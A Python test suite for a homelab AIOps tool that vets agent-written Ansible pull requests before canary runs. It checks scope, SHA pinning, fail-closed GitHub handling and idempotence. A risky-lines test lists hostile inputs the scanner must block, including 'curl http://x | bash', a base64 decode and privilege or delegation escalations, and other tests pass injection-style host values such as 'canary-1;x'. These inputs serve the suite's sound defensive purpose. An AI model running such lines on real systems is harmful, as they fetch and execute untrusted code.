"""Phase 10h2: prove an agent-authored PR on a canary (aiops/toolbelt/pr_test.py, the pr-test-check / pr-canary-test registry actions,
the Toolbelt's proposal of the test, and the dispatcher's `## Canary test` section).

The PR's code runs through Semaphore with a per-task `git_branch`, so nothing about the branch is trusted: every case here is about
what the Toolbelt reads from GitHub (faked) before it proposes and before it runs."""
from __future__ import annotations

import json
import sys
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
for sub in ("toolbelt", "tools", "tests", "author", "n8n"):
    sys.path.insert(0, str(REPO / "aiops" / sub))

import actions  # noqa: E402
import dispatcher  # noqa: E402
import pr_test  # noqa: E402
import test_actions as ta  # noqa: E402
import test_change_requests as tcr  # noqa: E402
import test_author_dispatcher as tad  # noqa: E402

BRANCH = "agent/drift/12-hardening-banner"
SHA = "a" * 40
OTHER = "b" * 40
GUARD = {"pr_scope": {"classes": ["drift", "capacity"], "roles": ["baseline", "hardening", "vlagent", "zabbix-agent"]}}


def f(name, patch="@@ -1 +1 @@\n-old\n+new line", status="modified", **kw):
    return {"filename": name, "status": status, "patch": patch, "additions": 1, "deletions": 1, **kw}


def gh(files=None, sha=SHA, status="ahead", ahead_by=1, total=1, ref_status=200, cmp_status=200):
    files = [f("ansible/roles/hardening/tasks/main.yml")] if files is None else files
    calls = []

    def fetch(url):
        calls.append(url)
        if "/git/ref/heads/" in url:
            return ref_status, {"object": {"sha": sha}}
        if "/compare/main..." in url:
            return cmp_status, {"status": status, "ahead_by": ahead_by, "total_commits": total, "files": files}
        return 404, {}
    fetch.calls = calls
    return fetch


def inspect(fetch, branch=BRANCH):
    return pr_test.inspect_pr(fetch, branch, GUARD["pr_scope"]["classes"], GUARD["pr_scope"]["roles"])


class Eligibility(unittest.TestCase):
    def test_a_role_change_for_a_canary_exercised_role_is_eligible_and_names_the_role_and_head(self):
        got = inspect(gh([f("ansible/roles/hardening/tasks/main.yml"), f("ansible/roles/hardening/defaults/main.yml")]))
        self.assertEqual((got["ok"], got["sha"], got["role_tag"], got["files"]), (True, SHA, "hardening", 2))

    def test_only_agent_branches_of_a_tested_class(self):
        for b in ("main", "feat/x", "agent/docs/3-x", "agent/drift/x-y", "agent/drift/3-UPPER", "agent/drift/3-"):
            self.assertFalse(inspect(gh(), b)["ok"], b)

    def test_github_failures_fail_closed(self):
        self.assertFalse(inspect(gh(ref_status=404))["ok"])
        self.assertFalse(inspect(gh(cmp_status=500))["ok"])
        self.assertFalse(inspect(lambda url: (0, {"error": "URLError"}))["ok"])

    def test_not_ahead_or_too_many_commits_or_files(self):
        self.assertFalse(inspect(gh(status="identical", ahead_by=0))["ok"])
        self.assertFalse(inspect(gh(status="behind", ahead_by=0))["ok"])
        self.assertFalse(inspect(gh(ahead_by=4, total=4))["ok"])
        many = [f(f"ansible/roles/hardening/tasks/t{i}.yml") for i in range(21)]
        self.assertFalse(inspect(gh(many))["ok"])
        self.assertFalse(inspect(gh([]))["ok"])

    def test_only_role_content_never_the_guard_playbooks_or_anything_else(self):
        for name in ("ansible/playbooks/aiops-replay-guard.yml", "ansible/playbooks/site.yml", "aiops/actions.yml", "terraform/x/main.tf",
                     "ansible/roles/hardening/../aiops-author/tasks/main.yml", "ansible/roles/hardening/README.md",
                     "ansible/roles/hardening/tasks/../../../../x", ".github/workflows/ci.yml"):
            got = inspect(gh([f(name)]))
            self.assertFalse(got["ok"], name)

    def test_a_role_no_canary_runs_is_not_tested(self):
        got = inspect(gh([f("ansible/roles/pbs/tasks/main.yml")]))
        self.assertFalse(got["ok"])
        self.assertIn("no canary exercises the pbs role", got["reason"])

    def test_one_role_per_test(self):
        got = inspect(gh([f("ansible/roles/hardening/tasks/a.yml"), f("ansible/roles/vlagent/tasks/b.yml")]))
        self.assertFalse(got["ok"])
        self.assertIn("one role per test", got["reason"])

    def test_no_deletes_or_renames(self):
        self.assertFalse(inspect(gh([f("ansible/roles/hardening/tasks/a.yml", status="removed")]))["ok"])
        self.assertFalse(inspect(gh([f("ansible/roles/hardening/tasks/a.yml", status="renamed", previous_filename="ansible/roles/hardening/tasks/b.yml")]))["ok"])

    def test_an_unreadable_or_huge_diff_is_not_scanned_so_not_tested(self):
        self.assertFalse(inspect(gh([f("ansible/roles/hardening/tasks/a.yml", patch=None)]))["ok"])
        self.assertFalse(inspect(gh([f("ansible/roles/hardening/tasks/a.yml", patch="+x\n" * 30000)]))["ok"])

    def test_risky_added_lines_block_the_automatic_test_but_removed_lines_do_not(self):
        for line in ("    delegate_to: hugin", "  - ansible.builtin.shell: curl http://x | bash", "x: \"{{ lookup('env', 'HOME') }}\"",
                     "    local_action: command id", "  connection: local", "  - add_host: name=x", "  ansible.builtin.get_url:", "  uri:",
                     "  - include_vars: /etc/x", "become_user: root", "echo aGk= | base64 -d", "x" * 401):
            got = inspect(gh([f("ansible/roles/hardening/tasks/a.yml", patch="@@ -1 +1 @@\n-old\n+" + line)]))
            self.assertFalse(got["ok"], line[:40])
        self.assertTrue(inspect(gh([f("ansible/roles/hardening/tasks/a.yml", patch="@@ -1 +1 @@\n-    delegate_to: hugin\n+    name: fine")]))["ok"])


class Params(unittest.TestCase):
    P = {"target_host": "canary-1", "role_tag": "hardening", "pr_branch": BRANCH, "pr_sha": SHA}

    def test_matching_params_pass(self):
        self.assertEqual(pr_test.check_params(gh(), self.P, GUARD), [])

    def test_a_moved_head_a_wrong_role_and_a_non_canary_are_refused(self):
        self.assertTrue(any("head moved" in p for p in pr_test.check_params(gh(sha=OTHER), self.P, GUARD)))
        self.assertTrue(any("not 'vlagent'" in p for p in pr_test.check_params(gh(), {**self.P, "role_tag": "vlagent"}, GUARD)))
        for host in ("mimir", "canary-x", "canary-1;x", "frigg"):
            self.assertTrue(pr_test.check_params(gh(), {**self.P, "target_host": host}, GUARD), host)


class Summary(unittest.TestCase):
    def view(self, state, steps=None, why=None):
        res = {"steps": steps} if steps is not None else ({"why": why} if why else None)
        if why and steps is not None:
            res["why"] = why
        return {"id": 31, "state": state, "params": {"target_host": "canary-2", "role_tag": "hardening", "pr_branch": BRANCH, "pr_sha": SHA}, "result": res}

    STEPS = [{"step": "prior:pr-test-check", "status": "success", "result": {"changed": 2, "ok": True}},
             {"step": "action", "status": "success", "result": {"changed": 2, "ok": True}},
             {"step": "verify:pr-test-check", "status": "success", "result": {"changed": 0, "ok": True}}]

    def test_every_state_has_a_status_and_a_readable_line(self):
        want = {"pending": "proposed", "approved": "running", "running": "running", "succeeded": "passed", "failed": "failed",
                "verify_failed": "failed", "expired": "expired", "rejected": "rejected", "cancelled": "cancelled"}
        for state, status in want.items():
            s = pr_test.summarize(self.view(state))
            self.assertEqual(s["status"], status, state)
            self.assertTrue(pr_test.render(s).strip())

    def test_a_passed_run_reports_counts_the_canary_and_idempotence(self):
        s = pr_test.summarize(self.view("succeeded", self.STEPS))
        self.assertEqual((s["dry_run_changes"], s["apply"], s["second_run_changed"], s["canary"], s["sha"]), (2, "ok", 0, "canary-2", "aaaaaaaa"))
        text = pr_test.render(s)
        self.assertIn("**Passed** on a canary", text)
        self.assertIn("(idempotent)", text)
        self.assertIn("full run output is in the private Discord thread", text)

    def test_a_non_idempotent_change_and_a_failure_say_so(self):
        steps = [dict(self.STEPS[0]), dict(self.STEPS[1]), {"step": "verify:pr-test-check", "status": "success", "result": {"changed": 3}}]
        s = pr_test.summarize(self.view("verify_failed", steps, why="the post-condition did not hold: changed: expected 0, got 3"))
        self.assertEqual(s["status"], "failed")
        self.assertIn("NOT idempotent", pr_test.render(s))
        self.assertIn("expected 0, got 3", pr_test.render(s))

    def test_not_tested_carries_its_reason_and_nothing_secret_shaped_is_invented(self):
        text = pr_test.render(pr_test.summarize(None, "no canary exercises the pbs role"))
        self.assertIn("**Not tested**: no canary exercises the pbs role", text)


class Engine(unittest.TestCase):
    P = {"target_host": "canary-1", "role_tag": "hardening", "pr_branch": BRANCH, "pr_sha": SHA}

    def script(self):
        ok = lambda n: [(("success", [f"canary-1 : ok=11 changed={n} unreachable=0 failed=0"]))]  # noqa: E731
        return {"aiops-replay-role-check": ok(2) + ok(0), "aiops-replay-role": ok(2)}

    def test_the_toolbelt_proposes_and_nobody_else_may(self):
        eng, *_ = ta.make(ta.FakeSemaphore(self.script()), pr_fetch=gh())
        for source in ("chat", "diagnosis", "operator"):
            with self.assertRaises(actions.Refused) as cm:
                eng.propose(action_id="pr-canary-test", params=self.P, reason="please test it", source=source)
            self.assertIn("proposed by the Toolbelt itself", str(cm.exception.detail["problems"]))
        out = eng.propose_pr_test(BRANCH, "chan-1", 5)
        self.assertEqual(out["target"], "canary-1")
        v = eng._view(out["proposal"])
        self.assertEqual((v["state"], v["action_id"], v["source"], v["thread_id"]), ("pending", "pr-canary-test", "author", "chan-1"))
        self.assertEqual(v["params"], self.P)

    def test_the_model_is_never_offered_these_actions(self):
        import build_ingest
        d = build_ingest.propose_tool_description()
        self.assertNotIn("pr-canary-test", d)
        self.assertNotIn("pr-test-check", d)

    def test_a_pr_it_cannot_test_gets_a_reason_not_a_proposal(self):
        eng, *_ = ta.make(ta.FakeSemaphore(self.script()), pr_fetch=gh([f("ansible/roles/pbs/tasks/main.yml")]))
        out = eng.propose_pr_test(BRANCH, None, 5)
        self.assertIn("no canary exercises the pbs role", out["ineligible"])
        eng2, *_ = ta.make(ta.FakeSemaphore(self.script()))  # no checker configured: fail closed
        self.assertIn("not enabled", eng2.propose_pr_test(BRANCH, None, 5)["ineligible"])

    def test_the_test_runs_the_prs_branch_through_semaphore_three_times_and_passes(self):
        sem = ta.FakeSemaphore(self.script())
        eng, *_ = ta.make(sem, pr_fetch=gh())
        pid = eng.propose_pr_test(BRANCH, None, 5)["proposal"]
        ta.approve(eng, pid)
        out = eng.execute(pid)
        self.assertEqual(out["state"], "succeeded", out)
        names = [s[0] for s in sem.started]
        self.assertEqual(names, ["aiops-replay-role-check", "aiops-replay-role", "aiops-replay-role-check"])  # dry run, converge, second dry run
        self.assertTrue(all(s[2]["git_branch"] == BRANCH for s in sem.started))  # the PR's code, never main's
        self.assertEqual(sem.started[0][2]["arguments"], ["--limit", "canary-1", "--check", "--diff", "--tags", "hardening"])
        self.assertEqual(sem.started[1][2]["arguments"], ["--limit", "canary-1", "--tags", "hardening"])
        s = pr_test.summarize(eng.pr_test_view(BRANCH))
        self.assertEqual((s["status"], s["dry_run_changes"], s["apply"], s["second_run_changed"]), ("passed", 2, "ok", 0))

    def test_a_change_that_is_not_idempotent_fails_verify(self):
        script = {"aiops-replay-role-check": [("success", ["canary-1 : ok=11 changed=2 unreachable=0 failed=0"]),
                                              ("success", ["canary-1 : ok=11 changed=1 unreachable=0 failed=0"])],
                  "aiops-replay-role": [("success", ["canary-1 : ok=11 changed=2 unreachable=0 failed=0"])]}
        eng, *_ = ta.make(ta.FakeSemaphore(script), pr_fetch=gh())
        pid = eng.propose_pr_test(BRANCH, None, 5)["proposal"]
        ta.approve(eng, pid)
        self.assertEqual(eng.execute(pid)["state"], "verify_failed")
        s = pr_test.summarize(eng.pr_test_view(BRANCH))
        self.assertEqual((s["status"], s["second_run_changed"]), ("failed", 1))

    def test_a_head_that_moved_after_approval_is_never_run(self):
        sem = ta.FakeSemaphore(self.script())
        eng, *_ = ta.make(sem, pr_fetch=gh())
        pid = eng.propose_pr_test(BRANCH, None, 5)["proposal"]
        ta.approve(eng, pid)
        eng.cfg.pr_fetch = gh(sha=OTHER)  # the author (or anyone with the PAT) pushed again after the operator looked
        out = eng.execute(pid)
        self.assertEqual(out["state"], "failed")
        self.assertIn("head moved", json.dumps(out["result"]))
        self.assertEqual(sem.started, [])  # nothing ran

    def test_a_head_that_moves_between_the_steps_stops_the_next_step(self):
        """Each step is its own Semaphore task and checks the branch out afresh, so the PR is re-read before every one."""
        sem = ta.FakeSemaphore(self.script())
        eng, *_ = ta.make(sem, pr_fetch=gh())
        pid = eng.propose_pr_test(BRANCH, None, 5)["proposal"]
        ta.approve(eng, pid)
        good, n = gh(), [0]

        def moves_after_the_first_step(url):
            n[0] += 1
            return gh(sha=OTHER)(url) if n[0] > 4 else good(url)  # calls 1-2: execute's re-validation, 3-4: before the dry run; then it moves

        eng.cfg.pr_fetch = moves_after_the_first_step
        out = eng.execute(pid)
        self.assertEqual(out["state"], "failed", out)
        self.assertIn("the PR changed under the test", json.dumps(out["result"]))
        self.assertEqual([s[0] for s in sem.started], ["aiops-replay-role-check"])  # the dry run ran; the converge never started

    def test_a_pr_that_turned_risky_after_approval_is_never_run(self):
        sem = ta.FakeSemaphore(self.script())
        eng, *_ = ta.make(sem, pr_fetch=gh())
        pid = eng.propose_pr_test(BRANCH, None, 5)["proposal"]
        ta.approve(eng, pid)
        eng.cfg.pr_fetch = gh([f("ansible/roles/hardening/tasks/main.yml", patch="@@ -1 +1 @@\n+    delegate_to: hugin")])
        self.assertEqual(eng.execute(pid)["state"], "failed")
        self.assertEqual(sem.started, [])

    def test_only_canaries_and_only_the_prs_own_role(self):
        eng, *_ = ta.make(ta.FakeSemaphore(self.script()), pr_fetch=gh())
        for bad in ({**self.P, "target_host": "mimir"}, {**self.P, "target_host": "canary-1; x"}, {**self.P, "role_tag": "vlagent"},
                    {**self.P, "pr_branch": "main"}, {**self.P, "pr_sha": "zz"}, {k: v for k, v in self.P.items() if k != "pr_sha"}):
            with self.assertRaises(actions.Refused, msg=str(bad)):
                eng.propose(action_id="pr-canary-test", params=bad, reason="the toolbelt proposes", source="author")

    def test_semaphore_start_sends_the_branch(self):
        sent = {}
        api = actions.SemaphoreAPI("http://x/api", "t", 1)
        api._call = lambda method, path, body=None: sent.update(body=body) or {"id": 9}
        api.start(5, {"a": 1}, {"git_branch": BRANCH, "arguments": ["--limit", "canary-1"]})
        self.assertEqual(sent["body"]["git_branch"], BRANCH)
        api.start(5, {}, {"arguments": ["--limit", "canary-1"]})
        self.assertNotIn("git_branch", sent["body"])  # every other action still runs main


class ChangeRequestWiring(unittest.TestCase):
    def setUp(self):
        self.r = tcr.Rig()
        self.eng = self.r.tb.engine
        self.eng.cfg.semaphore = ta.FakeSemaphore(Engine().script())

    def tearDown(self):
        self.r.close()

    def pr_open(self, cls="drift", branch=BRANCH, fetch=None):
        self.eng.cfg.pr_fetch = fetch or gh()
        cr = self.r.approved(**{"class": cls, "title": "Fix the hardening banner task"})
        self.r.call(tcr.T_AUTH, "POST", "/change-requests/claim")
        st, out = self.r.call(tcr.T_AUTH, "POST", f"/change-requests/{cr['id']}/report",
                              {"state": "pr-open", "pr_url": tcr.PR, "branch": branch, "summary": "x", "tests": {}})
        self.assertEqual(st, 200, out)
        return cr["id"], out

    def test_the_drift_class_is_enabled_narrowly_and_tested_the_docs_class_is_not(self):
        cls = tcr.CLASSES["classes"]
        self.assertTrue(cls["drift"]["enabled"] and cls["drift"]["canary_test"])
        self.assertTrue(all(p.split("/")[2] in pr_test_roles() for p in cls["drift"]["allow"]), cls["drift"]["allow"])
        self.assertFalse(cls["capacity"]["enabled"])
        self.assertFalse(cls["docs"].get("canary_test"))

    def test_reporting_a_tested_class_pr_proposes_the_test_next_to_the_requests_card(self):
        cid, out = self.pr_open()
        self.assertEqual(out["pr_test"]["status"], "proposed")
        self.assertEqual((out["pr_test"]["canary"], out["pr_test"]["role"]), ("canary-1", "hardening"))
        v = self.eng.pr_test_view(BRANCH)
        self.assertEqual((v["state"], v["source"]), ("pending", "author"))

    def test_an_untestable_pr_records_why_in_the_requests_own_view(self):
        cid, out = self.pr_open(fetch=gh([f("ansible/roles/pbs/tasks/main.yml")]))
        self.assertEqual(out["pr_test"]["status"], "not-tested")
        self.assertIn("pbs", out["pr_test"]["reason"])
        self.assertIsNone(self.eng.pr_test_view(BRANCH))

    def test_a_docs_pr_has_no_canary_section_at_all(self):
        cid, out = self.pr_open(cls="docs", branch="agent/docs/3-note")
        self.assertIsNone(out["pr_test"])
        self.assertIsNone(self.eng.pr_test_view("agent/docs/3-note"))

    def test_the_view_follows_the_proposal_to_passed(self):
        cid, out = self.pr_open()
        pid = self.eng.pr_test_view(BRANCH)["id"]
        ta.approve(self.eng, pid)
        self.assertEqual(self.eng.execute(pid)["state"], "succeeded")
        got = self.r.call(tcr.T_AUTH, "GET", f"/change-requests/{cid}")[1]
        self.assertEqual((got["pr_test"]["status"], got["pr_test"]["second_run_changed"]), ("passed", 0))


def pr_test_roles():
    return {"baseline", "hardening", "vlagent", "zabbix-agent"}


class Dispatcher(tad.Rig):
    TESTED = {**tad.CR, "id": 8, "class": "drift", "title": "Tighten the banner task", "allowed_paths": ["ansible/roles/hardening/**"]}

    def patch_for(self, body):
        return tad.patch_of(self.url, {"ansible/roles/hardening/tasks/banner.yml": body}, self.tmp)

    def test_the_description_gets_a_canary_section_that_is_filled_from_the_toolbelts_view(self):
        view = {"pr_test": {"status": "proposed", "proposal": 31, "canary": "canary-1", "role": "hardening", "sha": "aaaaaaaa"}}
        self.tb.report = lambda cid, **f: (self.tb.reports.append((cid, f)) or (200, view))
        self.gh.bodies, self.gh.patched = {200: ""}, []
        self.gh.get_pr_body = lambda n: self.gh.bodies.get(n)
        self.gh.set_pr_body = lambda n, b: (self.gh.bodies.__setitem__(n, b), self.gh.patched.append(n), 200)[2]
        cfg = dispatcher.Config(repo_url=self.url, work=str(self.work), classes=tad.CLASSES, tools_url="http://x", tools_cli="/c", agent_file="/a.md")
        # the class files in the test origin are the real ones; use a path the drift class allows
        d = self.disp(self.patch_for("- name: banner\n  ansible.builtin.debug:\n    msg: hi\n"), cfg=cfg)
        out = d.process(dict(self.TESTED))
        self.assertEqual(out["state"], "pr-open", out)
        first = self.gh.created[0][3]
        self.assertIn(dispatcher.CANARY_OPEN, first)
        self.assertIn("## Canary test", first)
        self.assertIn("Not tested", first)  # the placeholder until the Toolbelt's view arrives
        self.assertIn("waiting for the operator's approval", self.gh.bodies[200])  # replaced right after the report
        self.assertIn("proposal #31", self.gh.bodies[200])

    def test_the_section_is_replaced_in_place_and_only_when_it_changed(self):
        body = "intro\n\n## Summary\nx\n\n## Rollback\nrevert\n"
        a = dispatcher.with_canary_block(body, dispatcher.canary_block({"status": "proposed", "proposal": 1}))
        self.assertIn("## Canary test", a)
        self.assertLess(a.index("## Canary test"), a.index("## Rollback"))
        b = dispatcher.with_canary_block(a, dispatcher.canary_block({"status": "passed", "proposal": 1, "canary": "canary-1", "role": "hardening",
                                                                    "sha": "aaaaaaaa", "dry_run_changes": 2, "apply": "ok", "second_run_changed": 0}))
        self.assertEqual(b.count(dispatcher.CANARY_OPEN), 1)
        self.assertIn("**Passed** on a canary", b)
        self.assertTrue(b.startswith("intro") and b.rstrip().endswith("revert"))  # nothing around the section moved
        self.assertEqual(dispatcher.with_canary_block("no markers, no rollback", "BLOCK").count("BLOCK"), 1)

    def test_reconcile_patches_only_when_the_status_changes_and_never_for_untested_classes(self):
        gh = self.gh
        gh.bodies, gh.patched = {55: "## Rollback\nrevert\n", 56: "x"}, []
        gh.get_pr_body = lambda n: gh.bodies.get(n)
        gh.set_pr_body = lambda n, b: (gh.bodies.__setitem__(n, b), gh.patched.append(n), 200)[2]
        tested = {"id": 1, "pr_url": "https://github.com/XIIISins/homelab/pull/55", "pr_test": {"status": "running", "proposal": 3}}
        docs = {"id": 2, "pr_url": "https://github.com/XIIISins/homelab/pull/56", "pr_test": None}
        self.tb.prs = [tested, docs]
        d = self.disp()
        d.reconcile()
        d.reconcile()
        self.assertEqual(gh.patched, [55])  # once; the unchanged second pass made no GitHub write; the docs PR was never touched
        tested["pr_test"] = {"status": "passed", "proposal": 3, "canary": "canary-1", "role": "hardening", "sha": "aaaaaaaa",
                             "dry_run_changes": 1, "apply": "ok", "second_run_changed": 0}
        d.reconcile()
        self.assertEqual(gh.patched, [55, 55])
        self.assertIn("**Passed** on a canary", gh.bodies[55])
        self.assertEqual(gh.bodies[56], "x")


class ClassPolicy(unittest.TestCase):
    def test_the_replay_wrappers_and_guards_are_forbidden_to_every_class(self):
        import scope
        cfg = tcr.CLASSES
        for name in ("ansible/playbooks/aiops-replay-guard.yml", "ansible/playbooks/aiops-replay-role.yml", "ansible/playbooks/aiops-replay-role-check.yml",
                     "ansible/playbooks/drift-check.yml", "aiops/actions.yml"):
            self.assertTrue(scope.matches(name, cfg["deny"]), name)
            bad = scope.check(cfg, "agent/drift/1-x", [{"filename": name, "status": "modified", "additions": 1, "deletions": 0}])
            self.assertTrue(bad, name)

    def test_a_drift_pr_for_a_canary_role_passes_scope_and_other_roles_do_not(self):
        import scope
        ok = scope.check(tcr.CLASSES, "agent/drift/1-x", [{"filename": "ansible/roles/hardening/tasks/main.yml", "status": "modified", "additions": 1, "deletions": 0}])
        self.assertEqual(ok, [])
        for name in ("ansible/roles/pbs/tasks/main.yml", "ansible/roles/aiops-toolbelt/tasks/main.yml", "ansible/playbooks/site.yml"):
            self.assertTrue(scope.check(tcr.CLASSES, "agent/drift/1-x", [{"filename": name, "status": "modified", "additions": 1, "deletions": 0}]), name)


if __name__ == "__main__":
    unittest.main()
